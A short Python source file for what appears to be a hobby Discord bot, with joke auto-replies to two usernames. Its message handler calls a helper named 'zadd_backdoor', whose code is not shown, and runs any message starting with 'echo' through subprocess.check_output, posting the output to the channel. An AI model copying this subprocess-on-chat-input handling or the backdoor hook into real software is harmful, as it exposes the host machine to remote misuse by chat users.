import asyncio
import os
import subprocess

import discord
from discord.ext import commands, tasks
from dotenv import load_dotenv

import zadd_handlers as zh


class MyBot(commands.Bot):
    async def setup_hook(self):
        await self.load_extension("cogs.voice")


intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True

bot = MyBot(command_prefix="!", intents=intents)


@bot.event
async def on_ready():
    print(f"We have logged in as {bot.user}")


@bot.event
async def on_message(message: discord.Message):
    if message.author == bot.user:
        return

    await zh.zadd_backdoor(bot, message)
    await zh.always_respond_to(
        message, "m4rt1n1955", "Martin Martin er en uran hjort..."
    )
    await zh.always_respond_to(
        message, "alehandre", "Skibidi toilet sunset rizzler morning"
    )

    if message.content.startswith("echo"):
        print("Recieved:", message.content.split())
        await message.channel.send(
            subprocess.check_output(message.content.split()).decode("utf-8").strip()
        )
    await bot.process_commands(message)


if __name__ == "__main__":
    load_dotenv()
    DISCORD_TOKEN = os.getenv("DISCORD_TOKEN").strip("<>")
    # client.run(DISCORD_TOKEN)

    bot.run(DISCORD_TOKEN)
